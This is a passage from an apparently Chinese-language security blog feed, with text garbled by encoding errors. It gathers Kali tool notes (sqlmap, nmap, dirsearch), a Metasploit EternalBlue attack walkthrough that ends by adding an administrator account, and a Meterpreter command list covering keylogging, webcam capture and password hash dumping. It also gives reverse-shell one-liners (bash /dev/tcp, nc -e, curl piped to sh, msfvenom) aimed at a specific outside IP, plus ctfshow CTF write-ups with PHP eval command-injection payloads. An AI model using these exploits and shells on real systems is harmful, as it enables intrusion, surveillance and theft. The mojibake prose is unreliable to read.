</span><br><span class="line">--identify-waf æ£€æµ‹é˜²ç«å¢™ç±»å‹</span><br><span class="line"> </span><br><span class="line">--param-del=&quot;åˆ†å‰²ç¬¦&quot; è®¾ç½®å‚æ•°çš„åˆ†å‰²ç¬¦</span><br><span class="line"> </span><br><span class="line">--skip-urlencode ä¸è¿›è¡Œurlç¼–ç </span><br><span class="line"> </span><br><span class="line">--keep-alive è®¾ç½®æŒä¹…è¿æ¥ï¼ŒåŠ å¿«æ¢æµ‹é€Ÿåº¦</span><br><span class="line"> </span><br><span class="line">--null-connection æ£€ç´¢æ²¡æœ‰bodyå“åº”çš„å†…å®¹ï¼Œå¤šç”¨äºç›²æ³¨</span><br><span class="line"> </span><br><span class="line">--thread æœ€å¤§ä¸º10 è®¾ç½®å¤šçº¿ç¨‹</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/songbai220/article/details/109303110">(10æ¡æ¶ˆæ¯) sqlmapä½¿ç”¨æ•™ç¨‹(è¶…è¯¦ç»†)_Redmaple925çš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="nmapä½¿ç”¨"><a href="#nmapä½¿ç”¨" class="headerlink" title="nmapä½¿ç”¨"></a>nmapä½¿ç”¨</h2><p>nmapå¸¸ç”¨å‘½ä»¤<br>ä¸»æœºå‘ç° </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sL                     ä»…ä»…æ˜¯æ˜¾ç¤º,æ‰«æçš„IPæ•°ç›®,ä¸ä¼šè¿›è¡Œä»»ä½•æ‰«æ</span><br><span class="line">-sn                     pingæ‰«æ,å³ä¸»æœºå‘ç°</span><br><span class="line">-Pn                     ä¸æ£€æµ‹ä¸»æœºå­˜æ´»</span><br><span class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Pingå‘ç°</span><br><span class="line">-PE/PP/PM               ä½¿ç”¨ICMP echo, timestamp and netmask è¯·æ±‚åŒ…å‘ç°ä¸»æœº</span><br><span class="line">-PO[prococol list]      ä½¿ç”¨IPåè®®åŒ…æ¢æµ‹å¯¹æ–¹ä¸»æœºæ˜¯å¦å¼€å¯   </span><br><span class="line">-n/-R                   ä¸å¯¹IPè¿›è¡ŒåŸŸååå‘è§£æ/ä¸ºæ‰€æœ‰çš„IPéƒ½è¿›è¡ŒåŸŸåçš„åå“è§£æ</span><br></pre></td></tr></table></figure>

<p>awdä¸»æœºå‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=open(&#x27;pingtest.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in range(255):</span><br><span class="line">    ip = &quot;192-168-1-&quot; + str(i) +&quot;.pvp2155.bugku.cn&quot;</span><br><span class="line">    f.write(ip+&#x27;\n&#x27;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>æ‰¹é‡æ‰«æå­˜è´§ä¸»æœº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -iL /home/zhou/æ¡Œé¢/pingtest.txt -sn</span><br></pre></td></tr></table></figure>



<h2 id="dirsearchä½¿ç”¨"><a href="#dirsearchä½¿ç”¨" class="headerlink" title="dirsearchä½¿ç”¨"></a>dirsearchä½¿ç”¨</h2><p>å¸¸ç”¨äºæš´åŠ›æ‰«æé¡µé¢ç»“æ„ï¼ŒåŒ…æ‹¬ç½‘é¡µä¸­çš„ç›®å½•å’Œæ–‡ä»¶</p>
<p>ç®€å•ä½¿ç”¨</p>
<p>-u,â€“url                    ç›®æ ‡url<br>-l,â€“url-list&#x3D;FILE          ç›®æ ‡urlæ–‡ä»¶è·¯å¾„<br>â€“stdin                     ä»æ ‡å‡†è¾“å…¥ä¸­æŒ‡å®šurl<br>â€“cidr                      ç›®æ ‡ç½‘æ®µ<br>â€“raw&#x3D;File                  ä»æ–‡ä»¶ä¸­è¯»å–requestæŠ¥æ–‡,é€šè¿‡-schemaæŒ‡å®šç­–ç•¥(å¦‚â€“schema https)</p>
<p><a href="https://so.csdn.net/so/search?q=dirsearch&t=&u=&urw=">dirsearch- CSDNæœç´¢</a> </p>
<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>æ°¸æ’ä¹‹è“</p>
<p>windos7é•œåƒä¸‹è½½</p>
<p><a href="https://www.imsdn.cn/windows-server/windows-server-2008-r2/">Windows Server 2008 R2 ISOé•œåƒä¸‹è½½ - æˆ‘çš„MSDN (imsdn.cn)</a></p>
<p>1.å¯åŠ¨msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p>2.æœç´¢å¯ä»¥ç”¨çš„æ¨¡æ¿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 3   #ä½¿ç”¨auxiliary/scanner/smb/smb_ms17_010  è¿›è¡Œæ‰«ææ˜¯å¦å­˜åœ¨MS17-010æ¼æ´</span><br><span class="line">show options   #æŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°</span><br><span class="line">set rhosts 192.168.158.150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p>è‹¥å­˜åœ¨å¦‚ä¸Šå›¾æ‰€ç¤º</p>
<ol start="4">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 0 #exploit/windows/smb/ms17_010_eternalblueæ˜¯æ°¸æ’ä¹‹è“æ”»å‡»ä»£ç </span><br><span class="line">show options   #æŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°</span><br><span class="line">set rhosts 192.168.158.150 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>æ”»å‡»å®Œæˆ</p>
<p>5.æ˜¾ç¤º   win  å­—æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell    #è¿›å…¥å‘½ä»¤è¡Œ</span><br><span class="line">chcp 65001    ##åˆ‡æ¢ç¼–ç ï¼Œè§£å†³ä¹±ç é—®é¢˜</span><br><span class="line">exit   #ç¦»å¼€shell</span><br><span class="line">background #æŠŠæˆ‘ä»¬è·å¾—çš„meterpreterä¼šè¯æŒ‚è½½åˆ°åå°è¿è¡Œ</span><br><span class="line">sessions   #æ˜¾ç¤ºæ‰€æœ‰ä¼šè¯</span><br><span class="line">sessions id   #è¿›å…¥ä¼šè¯</span><br></pre></td></tr></table></figure>



<ol start="6">
<li></li>
</ol>
<p>1ã€åˆ›å»ºæ–°ç”¨æˆ· ï¼Œè¯­æ³•ï¼šnet user ç”¨æˆ·å å¯†ç  &#x2F;add</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user sss @123qwe /add</span><br><span class="line">net localgroup administrators sss /add  #å°†ç”¨æˆ·sssæ·»åŠ è‡³ç®¡ç†å‘˜ç»„</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Meterpreter &gt; ?</span><br><span class="line">==========================================</span><br><span class="line">æ ¸å¿ƒå‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             å¸®åŠ©èœå•</span><br><span class="line">background                    æŠŠå½“å‰ä¼šè¯æŒ‚åˆ°åå°è¿è¡Œ</span><br><span class="line">bg                            backgroundå‘½ä»¤çš„åˆ«å</span><br><span class="line">bgkill                        æ€æ­»åå°meterpreter è„šæœ¬</span><br><span class="line">bglist                        åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„åå°è„šæœ¬</span><br><span class="line">bgrun                         æ‰§è¡Œä¸€ä¸ªmeterpreterè„šæœ¬ä½œä¸ºåå°çº¿ç¨‹</span><br><span class="line">channel                       æ˜¾ç¤ºä¿¡æ¯æˆ–æ§åˆ¶æ´»åŠ¨é¢‘é“</span><br><span class="line">close                         å…³é—­ä¸€ä¸ªé¢‘é“</span><br><span class="line">detach                        åˆ†ç¦»Meterpreterä¼šè¯ï¼ˆç”¨äº http/httpsï¼‰</span><br><span class="line">disable_unicode_encoding      ç¦ç”¨ unicode å­—ç¬¦ä¸²çš„ç¼–ç </span><br><span class="line">enable_unicode_encoding       å¯ç”¨ unicode å­—ç¬¦ä¸²çš„ç¼–ç </span><br><span class="line">exit                          ç»ˆæ­¢ Meterpreter ä¼šè¯</span><br><span class="line">get_timeouts                  è·å–å½“å‰ä¼šè¯è¶…æ—¶å€¼</span><br><span class="line">guid                          è·å–ä¼šè¯ GUID</span><br><span class="line">help                          å¸®åŠ©èœå•</span><br><span class="line">info                          æ˜¾ç¤ºæœ‰å…³ Post æ¨¡å—çš„ä¿¡æ¯</span><br><span class="line">irb                           åœ¨å½“å‰ä¼šè¯ä¸­æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼ Ruby shell</span><br><span class="line">load                          åŠ è½½ä¸€ä¸ªæˆ–å¤šä¸ª Meterpreter æ‰©å±•</span><br><span class="line">machine_id                    è·å–è¿æ¥åˆ°ä¼šè¯çš„æœºå™¨çš„ MSF ID</span><br><span class="line">migrate                       å°†æœåŠ¡å™¨è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹</span><br><span class="line">pivot                         ç®¡ç†æ¢è½´ä¾¦å¬å™¨</span><br><span class="line">pry                           åœ¨å½“å‰ä¼šè¯ä¸Šæ‰“å¼€ Pry è°ƒè¯•å™¨</span><br><span class="line">quit                          ç»ˆæ­¢ Meterpreter ä¼šè¯</span><br><span class="line">read                          ä»é€šé“è¯»å–æ•°æ®</span><br><span class="line">resource                      è¿è¡Œå­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤</span><br><span class="line">run                           æ‰§è¡Œä¸€ä¸ª Meterpreter è„šæœ¬æˆ– Post æ¨¡å—</span><br><span class="line">secure                       ï¼ˆé‡æ–°ï¼‰åå•†ä¼šè¯ä¸Šçš„ TLV æ•°æ®åŒ…åŠ å¯†</span><br><span class="line">sessions                      å¿«é€Ÿåˆ‡æ¢åˆ°å¦ä¸€ä¸ªä¼šè¯</span><br><span class="line">set_timeouts                  è®¾ç½®å½“å‰ä¼šè¯è¶…æ—¶å€¼</span><br><span class="line">sleep                         å¼ºåˆ¶ Meterpreter å®‰é™ï¼Œç„¶åé‡æ–°å»ºç«‹ä¼šè¯</span><br><span class="line">ssl_verify                    ä¿®æ”¹ SSL è¯ä¹¦éªŒè¯è®¾ç½®</span><br><span class="line">transport                     ç®¡ç†è¿è¾“æœºåˆ¶</span><br><span class="line">use                           ä¸æ¨èä½¿ç”¨çš„loadå‘½ä»¤åˆ«å</span><br><span class="line">uuid                          è·å–å½“å‰ä¼šè¯çš„ UUID</span><br><span class="line">write                         å°†æ•°æ®å†™å…¥é€šé“</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šæ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">cat                           å°†æ–‡ä»¶å†…å®¹è¯»åˆ°å±å¹•ä¸Š</span><br><span class="line">cd                            åˆ‡æ¢ç›®å½•</span><br><span class="line">checksum                      æ£€ç´¢æ–‡ä»¶çš„æ ¡éªŒå’Œ</span><br><span class="line">cp                            å°†æºå¤åˆ¶åˆ°ç›®æ ‡</span><br><span class="line">del                           åˆ é™¤æŒ‡å®šæ–‡ä»¶</span><br><span class="line">dir                           åˆ—å‡ºæ–‡ä»¶ï¼ˆls çš„åˆ«åï¼‰</span><br><span class="line">download                      ä¸‹è½½æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">edit                          ç¼–è¾‘æ–‡ä»¶</span><br><span class="line">getlwd                        æ‰“å°æœ¬åœ°å·¥ä½œç›®å½•</span><br><span class="line">getwd                         æ‰“å°å·¥ä½œç›®å½•</span><br><span class="line">lcd                           æ›´æ”¹æœ¬åœ°å·¥ä½œç›®å½•</span><br><span class="line">lls                           åˆ—å‡ºæœ¬åœ°æ–‡ä»¶</span><br><span class="line">lpwd                          æ‰“å°æœ¬åœ°å·¥ä½œç›®å½•</span><br><span class="line">ls                            åˆ—å‡ºæ–‡ä»¶</span><br><span class="line">mkdir                         åˆ¶ä½œç›®å½•</span><br><span class="line">mv                            å°†æºç§»åŠ¨åˆ°ç›®æ ‡</span><br><span class="line">pwd                           æ‰“å°å·¥ä½œç›®å½•</span><br><span class="line">rm                            åˆ é™¤æŒ‡å®šæ–‡ä»¶</span><br><span class="line">rmdir                         åˆ é™¤ç›®å½•</span><br><span class="line">search                        æœç´¢æ–‡ä»¶</span><br><span class="line">show_mount                    åˆ—å‡ºæ‰€æœ‰æŒ‚è½½ç‚¹/é€»è¾‘é©±åŠ¨å™¨</span><br><span class="line">upload                        ä¸Šä¼ æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç½‘ç»œå‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           æ˜¾ç¤ºä¸»æœº ARP ç¼“å­˜</span><br><span class="line">getproxy                      æ˜¾ç¤ºå½“å‰ä»£ç†é…ç½®</span><br><span class="line">ifconfig                      æ˜¾ç¤ºç•Œé¢</span><br><span class="line">ipconfig                      æ˜¾ç¤ºæ¥å£</span><br><span class="line">netstat                       æ˜¾ç¤ºç½‘ç»œè¿æ¥</span><br><span class="line">portfwd                       å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹æœåŠ¡</span><br><span class="line">resolve                       è§£æç›®æ ‡ä¸Šçš„ä¸€ç»„ä¸»æœºå</span><br><span class="line">route                         æŸ¥çœ‹å’Œä¿®æ”¹è·¯ç”±è¡¨</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç³»ç»Ÿå‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       æ¸…é™¤äº‹ä»¶æ—¥å¿—</span><br><span class="line">drop_token                    æ”¾å¼ƒä»»ä½•æ´»åŠ¨çš„æ¨¡æ‹Ÿä»¤ç‰Œã€‚</span><br><span class="line">execute                       æ‰§è¡Œå‘½ä»¤</span><br><span class="line">getenv                        è·å–ä¸€ä¸ªæˆ–å¤šä¸ªç¯å¢ƒå˜é‡å€¼</span><br><span class="line">getpid                        è·å–å½“å‰è¿›ç¨‹æ ‡è¯†ç¬¦</span><br><span class="line">getprivs                      å°è¯•å¯ç”¨å½“å‰è¿›ç¨‹å¯ç”¨çš„æ‰€æœ‰æƒé™</span><br><span class="line">getid                         è·å–æœåŠ¡å™¨è¿è¡Œçš„ç”¨æˆ·çš„ SID</span><br><span class="line">getuid                        è·å–æœåŠ¡å™¨è¿è¡Œçš„ç”¨æˆ·</span><br><span class="line">kill                          ç»ˆæ­¢è¿›ç¨‹</span><br><span class="line">localtime                     æ˜¾ç¤ºç›®æ ‡ç³»ç»Ÿæœ¬åœ°æ—¥æœŸå’Œæ—¶é—´</span><br><span class="line">pgrep                         æŒ‰åç§°è¿‡æ»¤è¿›ç¨‹</span><br><span class="line">pkill                         æŒ‰åç§°ç»ˆæ­¢è¿›ç¨‹</span><br><span class="line">ps                            åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</span><br><span class="line">reboot                        é‡å¯è¿œç¨‹è®¡ç®—æœº</span><br><span class="line">reg                           ä¿®æ”¹è¿œç¨‹æ³¨å†Œè¡¨å¹¶ä¸ä¹‹äº¤äº’</span><br><span class="line">rev2self                      åœ¨è¿œç¨‹æœºå™¨ä¸Šè°ƒç”¨ RevertToSelf()</span><br><span class="line">shell                         æ”¾å…¥ç³»ç»Ÿå‘½ä»¤ shell</span><br><span class="line">shutdown                      å…³é—­è¿œç¨‹è®¡ç®—æœº</span><br><span class="line">steal_token                   å°è¯•ä»ç›®æ ‡è¿›ç¨‹çªƒå–æ¨¡æ‹Ÿä»¤ç‰Œ</span><br><span class="line">suspend                       æš‚åœæˆ–æ¢å¤è¿›ç¨‹åˆ—è¡¨</span><br><span class="line">sysinfo                       è·å–æœ‰å…³è¿œç¨‹ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œä¾‹å¦‚ OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç”¨æˆ·ç•Œé¢å‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  åˆ—å‡ºæ‰€æœ‰å¯è®¿é—®çš„æ¡Œé¢å’Œçª—å£ç«™</span><br><span class="line">getdesktop                    è·å–å½“å‰çš„meterpreteræ¡Œé¢</span><br><span class="line">idletime                      è¿”å›è¿œç¨‹ç”¨æˆ·ç©ºé—²çš„ç§’æ•°</span><br><span class="line">keyboard_send                 å‘é€å‡»é”®</span><br><span class="line">keyevent                      å‘é€æŒ‰é”®äº‹ä»¶</span><br><span class="line">keyscan_dump                  è½¬å‚¨å‡»é”®ç¼“å†²åŒº</span><br><span class="line">keyscan_start                 å¼€å§‹æ•è·å‡»é”®</span><br><span class="line">keyscan_stop                  åœæ­¢æ•è·å‡»é”®</span><br><span class="line">mouse                         å‘é€é¼ æ ‡äº‹ä»¶</span><br><span class="line">screenshare                   å®æ—¶è§‚çœ‹è¿œç¨‹ç”¨æˆ·æ¡Œé¢</span><br><span class="line">screenshot                    æŠ“å–äº¤äº’å¼æ¡Œé¢çš„æˆªå›¾</span><br><span class="line">setdesktop                    æ›´æ”¹meterpreterså½“å‰æ¡Œé¢</span><br><span class="line">uictl                         æ§åˆ¶ä¸€äº›ç”¨æˆ·ç•Œé¢ç»„ä»¶</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç½‘ç»œæ‘„åƒå¤´å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    ä»é»˜è®¤éº¦å…‹é£å½•åˆ¶éŸ³é¢‘ X ç§’</span><br><span class="line">webcam_chat                   å¼€å§‹è§†é¢‘èŠå¤©</span><br><span class="line">webcam_list                   åˆ—å‡ºç½‘ç»œæ‘„åƒå¤´</span><br><span class="line">webcam_snap                   ä»æŒ‡å®šçš„ç½‘ç»œæ‘„åƒå¤´æ‹æ‘„å¿«ç…§</span><br><span class="line">webcam_stream                 ä»æŒ‡å®šçš„ç½‘ç»œæ‘„åƒå¤´æ’­æ”¾è§†é¢‘æµ</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šéŸ³é¢‘è¾“å‡ºå‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ’­æ”¾æ³¢å½¢éŸ³é¢‘æ–‡ä»¶ (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Privï¼šæƒé™æå‡å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     å°è¯•å°†æ‚¨çš„æƒé™æå‡åˆ°æœ¬åœ°ç³»ç»Ÿçš„æƒé™ã€‚</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Privï¼šå¯†ç æ•°æ®åº“å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      è½¬å‚¨ SAM æ•°æ®åº“çš„å†…å®¹</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Privï¼šTimestomp å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">timestomp                     æ“ä½œæ–‡ä»¶ MACE å±æ€§</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">(4æ¡æ¶ˆæ¯) ã€å·¥å…·ä½¿ç”¨ã€‘â€”â€”Metasploit(MSF)ä½¿ç”¨è¯¦è§£(è¶…è¯¦ç»†)_metasploitä½¿ç”¨æ•™ç¨‹_å‰‘å®¢ getshellçš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p><a href="https://blog.csdn.net/weixin_44268918/article/details/129771330">(9æ¡æ¶ˆæ¯) äº‘æœåŠ¡å™¨åœ¨CentOS7ä¸­å®‰è£…msfå·¥å…·_centos7å®‰è£…msf_å‰æ¤’é±¼å¤´æ²¡å‰æ¤’çš„åšå®¢-CSDNåšå®¢</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport </span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=101.43.182.125 LPORT=9999 R &gt; test.php</span><br></pre></td></tr></table></figure>

<h3 id="bash-åå¼¹shell"><a href="#bash-åå¼¹shell" class="headerlink" title="bash åå¼¹shell"></a>bash åå¼¹shell</h3><p><strong>æŸ¥è¯¢å½“å‰shellå‘½ä»¤</strong>  <strong>ls -l &#x2F;bin&#x2F;sh</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/101.43.182.125/5000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>ç”±äºæœ‰çš„dockerå¹¶æ²¡æœ‰bashå‘½ä»¤ï¼Œå¯ä»¥é…åˆä½¿ç”¨curlæŒ‡ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. On your machine:</span><br><span class="line">#      nc -l 1337</span><br><span class="line">#</span><br><span class="line"># 2. On the target machine:</span><br><span class="line">curl https://your-shell.com/yourip:1337 | sh</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://your-shell.com/101.43.182.125:5000 | sh</span><br></pre></td></tr></table></figure>

<p>ç”±äºæˆ‘çš„äº‘æœåŠ¡å™¨å·²ç»å¼€èµ·äº†httpæœåŠ¡ï¼Œä½†æ˜¯æˆ‘å¹¶ä¸æƒ³åœ¨æˆ‘çš„ç½‘ç«™ä¸‹æ”¾å†…å®¹æ‰€ä»¥</p>
<p>å¯ä»¥ä½¿ç”¨python3 å¿«é€Ÿåˆ›å»ºä¸€ä¸ªhttp æœåŠ¡åœ¨æŸä¸ªç«¯å£</p>
<p>cdï¼Œåˆ°ä½ æƒ³è¦çš„æŸä¸ªæ–‡ä»¶å¤¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server ç«¯å£</span><br></pre></td></tr></table></figure>

<p>åœ¨è¯¥ç«¯å£ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶</p>
<h3 id="ncåå¼¹shell"><a href="#ncåå¼¹shell" class="headerlink" title="ncåå¼¹shell"></a>ncåå¼¹shell</h3><p>åå‘è¿æ¥</p>
<p>æ”»å‡»æœºæ‰§è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>

<p>é¶æœºæ‰§è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 101.43.182.125 5000 -e /bin/sh</span><br></pre></td></tr></table></figure>

<p>æ­£å‘è¿æ¥</p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_web_èœç‹—æ¯</title>
    <url>/2023/01/08/ctfshow_web_%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    <content><![CDATA[<p>  æˆ‘æ˜¯èœç‹—</p>
 <span id="more"></span>

<h1 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQç¾¤:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]);</span><br></pre></td></tr></table></figure>

<p>åŠ å…¥cookieä¸­ä¼ å…¥<code>CTFshow-QQç¾¤:=a</code>é‚£ä¹ˆå°±ä¼šå‡ºç°<code>$_POST[&#39;a&#39;]</code>ï¼Œå‡å¦‚postä¼ å…¥çš„å€¼ä¸º<code>a=b</code>ï¼Œé‚£ä¹ˆå°±ä¼šå¾—åˆ°<code>$_GET[&#39;b&#39;]</code>ï¼Œæ¥ç€å‡å¦‚getä¼ å…¥<code>b=c</code>å°±ä¼šå¾—åˆ°&#96;$_REQUEST[â€˜câ€™]</p>
<p><code>?b=c&amp;c[0]=1&amp;c[6][0][7][5][8][0][9][4][4]=system(&quot;ls /&quot;);</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQç¾¤:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]); `bin dev etc f1agaaa home lib media mnt proc root run sbin srv sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure>

<p><code>http://b931900e-462b-453b-9822-8631dc625e3e.challenge.ctf.show/?b=c&amp;c[0]=1&amp;c[6][0][7][5][8][0][9][4][4]=system(&quot;tac /f1a*&quot;);</code></p>
<p>ctfshow{c41273bb-5a71-44b9-9dc2-a9eaba87804d}</p>
<h1 id="æˆ‘çš„çœ¼é‡Œåªæœ‰"><a href="#æˆ‘çš„çœ¼é‡Œåªæœ‰" class="headerlink" title="æˆ‘çš„çœ¼é‡Œåªæœ‰$"></a>æˆ‘çš„çœ¼é‡Œåªæœ‰$</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>playload:</p>
<p><code>_=a1&amp;a1=a2&amp;a2=a3&amp;a3=a4&amp;a4=a5&amp;a5=a6&amp;a6=a7&amp;a7=a8&amp;a8=a9&amp;a9=a10&amp;a10=a11&amp;a11=a12&amp;a12=a15&amp;a15=a16&amp;a16=a17&amp;a17=a18&amp;a18=a19&amp;a19=a20&amp;a20=a21&amp;a21=a22&amp;a22=a23&amp;a23=a24&amp;a24=a25&amp;a25=a26&amp;a26=a27&amp;a27=a28&amp;a28=a29&amp;a29=a30&amp;a30=a31&amp;a31=a32&amp;a32=a33&amp;a33=a34&amp;a34=a35&amp;a35=a36&amp;a36=a37&amp;a37=system(&#39;ls /&#39;);</code></p>
<p><code>bin dev etc f1agaaa home lib media mnt proc root run sbin srv sys tmp usr var &lt;?php</code></p>
<p><code>=system(&#39;cat /f*&#39;);</code></p>
<p><code>ctfshow&#123;e1b2ed6c-fbb8-4c73-876e-ec6a41950797&#125;</code></p>
